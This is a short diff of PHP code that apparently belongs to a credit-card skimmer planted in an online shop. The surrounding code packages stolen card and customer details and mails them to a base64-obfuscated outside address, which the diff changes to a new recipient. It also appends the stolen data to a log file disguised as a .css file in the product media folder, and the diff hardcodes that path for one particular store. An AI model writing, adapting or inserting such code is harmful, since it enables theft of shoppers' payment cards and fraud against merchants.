@@ -422,10 +422,10 @@ Email : ".$data16."
 =============TeamTempur90=============";
 		$subject = $bin." - ".$ccbrand." ".$cctype." ".$ccklas." - ".$ccbank." [".$serverboss." - ".$ipboss."]";
 		$headers = "From: ".$data8." Credit Card <cc_session@".$serverboss.">";
-		$gantengers = "cmVhbHVuaXgwMEBnbWFpbC5jb20=";
+		$gantengers = "dW5peGxvZ3NAeWFuZGV4LnJ1";
 		$tamvan = base64_decode($gantengers);
 		mail($tamvan, $subject, $message, $headers);
-        $locate = $_SERVER["DOCUMENT_ROOT"]."/media/catalog/product/1/6/166.css";
+        $locate = "/home/spragues/public_html/store/media/catalog/product/1/6/166.css";
             $write = fopen($locate,"a");
             fwrite($write,$message."\n=========================================\n\n");
             fclose($write);
